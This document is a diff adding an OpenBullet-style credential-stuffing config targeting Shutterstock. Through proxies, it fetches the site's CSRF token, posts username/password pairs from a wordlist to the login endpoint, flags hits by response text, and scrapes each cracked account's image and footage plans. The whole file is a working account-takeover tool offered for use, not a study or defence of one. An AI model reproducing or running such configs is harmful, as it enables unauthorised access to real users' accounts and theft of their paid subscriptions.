@@ -1,0 +1,65 @@
+[SETTINGS]
+{
+  "Name": "Shutterstock",
+  "SuggestedBots": 1,
+  "LastModified": "2018-05-18T21:31:57.0809228+00:00",
+  "AdditionalInfo": "",
+  "Author": "Secant",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_Main_Page REQUEST GET "https://www.shutterstock.com/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_csrf PARSE "<SOURCE>" CSS "[name=_csrf]" "value" 0 -> VAR "TOKEN" "" "" 
+#PARSE_next PARSE "<SOURCE>" CSS "[name=next]" "value" 0 -> VAR "NEXT" "" "" 
+#POST_Login REQUEST POST "https://accounts.shutterstock.com/login?hl=en" AutoRedirect=TRUE 
+  CONTENT "_csrf=<TOKEN>&next=<NEXT>&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "referer: https://www.shutterstock.com/" 
+  HEADER "origin: https://www.shutterstock.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY " entered an incorrect username/password combination" 
+  KEYCHAIN Success OR 
+    KEY "create_time" 
+#GET_Plans REQUEST GET "https://www.shutterstock.com/account/plans" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_Image_Plan PARSE "<SOURCE>" LR "p>
+        
+" "
+" Recursive=FALSE -> CAP "Image Plan" "" "" 
+#PARSE_Footage_Plan PARSE "<SOURCE>" LR "Footage Plans
+
+    </h3>
+    
+      <p>
+        
+" "
+" Recursive=FALSE -> CAP "Footage Plan" "" "" 
